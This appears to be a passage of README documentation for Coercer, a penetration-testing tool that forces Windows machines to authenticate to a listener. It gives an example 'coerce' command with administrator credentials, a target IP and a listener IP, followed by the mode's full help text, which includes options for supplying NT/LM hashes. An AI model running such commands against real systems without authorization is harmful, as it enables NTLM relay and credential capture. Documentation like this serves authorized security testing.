### Coerce mode

```
./Coercer.py coerce -u 'Administrator' -p 'Admin123!' --target 192.168.1.46 --listener-ip 192.168.1.17
```

Complete help of this mode:

```
# ./Coercer.py coerce -h
       ______
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.1-blackhat-edition
    \____/\____/\___/_/   \___/\___/_/       by Remi GASCOU (Podalirius)

usage: Coercer.py coerce [-h] [-v] [--delay DELAY] [--http-port HTTP_PORT] [--smb-port SMB_PORT] [--filter-method-name FILTER_METHOD_NAME] [--filter-protocol-name FILTER_PROTOCOL_NAME] [-u USERNAME] [-p PASSWORD] [-d DOMAIN]
                         [--hashes [LMHASH]:NTHASH] [--no-pass] [--dc-ip ip address] (-t TARGET_IP | -f TARGETS_FILE) [-l LISTENER_IP]

options:
  -h, --help            show this help message and exit
  -v, --verbose         Verbose mode (default: False)
  -t TARGET_IP, --target-ip TARGET_IP
                        IP address or hostname of the target machine
  -f TARGETS_FILE, --targets-file TARGETS_FILE
                        File containing a list of IP address or hostname of the target machines

Advanced configuration:
  --delay DELAY         Delay between attempts (in seconds)
  --http-port HTTP_PORT
                        HTTP port (default: 80)
  --smb-port SMB_PORT   SMB port (default: 445)

Filtering methods:
  --filter-method-name FILTER_METHOD_NAME
  --filter-protocol-name FILTER_PROTOCOL_NAME

Credentials:
  -u USERNAME, --username USERNAME
                        Username to authenticate to the machine.
  -p PASSWORD, --password PASSWORD
                        Password to authenticate to the machine. (if omitted, it will be asked unless -no-pass is specified)
  -d DOMAIN, --domain DOMAIN
                        Windows domain name to authenticate to the machine.
  --hashes [LMHASH]:NTHASH
                        NT/LM hashes (LM hash can be empty)
  --no-pass             Don't ask for password (useful for -k)
  --dc-ip ip address    IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter

Listener:
  -l LISTENER_IP, --listener-ip LISTENER_IP
                        IP address or hostname of the listener machine
```